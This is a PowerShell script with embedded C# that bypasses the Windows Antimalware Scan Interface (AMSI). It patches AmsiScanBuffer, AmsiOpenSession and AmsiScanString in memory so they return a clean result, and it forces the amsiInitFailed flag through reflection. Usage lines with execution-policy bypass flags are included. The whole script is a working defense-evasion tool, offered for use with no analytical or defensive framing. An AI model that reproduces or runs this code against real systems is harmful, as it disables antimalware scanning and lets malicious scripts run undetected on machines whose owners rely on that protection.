<#
.SYNOPSIS
    AMSI bypass via AmsiScanBuffer memory patching (PowerShell in-memory)

.DESCRIPTION
    Patches amsi.dll!AmsiScanBuffer / AmsiOpenSession / AmsiScanString
    to return AMSI_RESULT_CLEAN (0). Also sets AmsiUtils.amsiInitFailed.

    Uses Add-Type with embedded C# P/Invoke code. No files dropped.
    Supports both x64 and x86.

.EXAMPLE
    powershell -NoP -NonI -Exec Bypass -File amsi_bypass.ps1
    powershell -NoP -NonI -Exec Bypass -File amsi_bypass.ps1 -Etw
#>

param([switch]$Etw)

$code = @'
using System;
using System.Runtime.InteropServices;
using System.Reflection;

public class AmsiBypassPS {
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string n);

    public static int Bypass() {
        IntPtr amsi = GetModuleHandle("amsi.dll");
        if (amsi == IntPtr.Zero) { amsi = LoadLibrary("amsi.dll"); }
        if (amsi == IntPtr.Zero) { return -1; }

        byte[] patch = IntPtr.Size == 8
            ? new byte[] { 0x31, 0xC0, 0xC3 }
            : new byte[] { 0x31, 0xC0, 0xC2, 0x18, 0x00 };

        int count = 0;
        foreach (var fn in new[] { "AmsiScanBuffer", "AmsiOpenSession", "AmsiScanString" }) {
            IntPtr a = GetProcAddress(amsi, fn);
            if (a != IntPtr.Zero) {
                uint o, w;
                VirtualProtect(a, (uint)patch.Length, 0x40, out o);
                WriteProcessMemory(GetCurrentProcess(), a, patch, (uint)patch.Length, out w);
                VirtualProtect(a, (uint)patch.Length, o, out o);
                count++;
            }
        }

        // Patch amsiInitFailed
        try {
            var t = Assembly.Load("System.Management.Automation")
                .GetType("System.Management.Automation.AmsiUtils");
            if (t != null) {
                var f = t.GetField("amsiInitFailed",
                    BindingFlags.NonPublic | BindingFlags.Static);
                if (f != null) { f.SetValue(null, true); }
            }
        } catch { }
        return count;
    }
}
'@

Add-Type -TypeDefinition $code

$result = [AmsiBypassPS]::Bypass()
if ($result -ge 3) {
    Write-Host "[+] AMSI BYPASSED: $result functions patched" -ForegroundColor Green
} elseif ($result -gt 0) {
    Write-Host "[+] Partial bypass: $result functions" -ForegroundColor Yellow
} else {
    Write-Host "[-] Bypass failed" -ForegroundColor Red
}
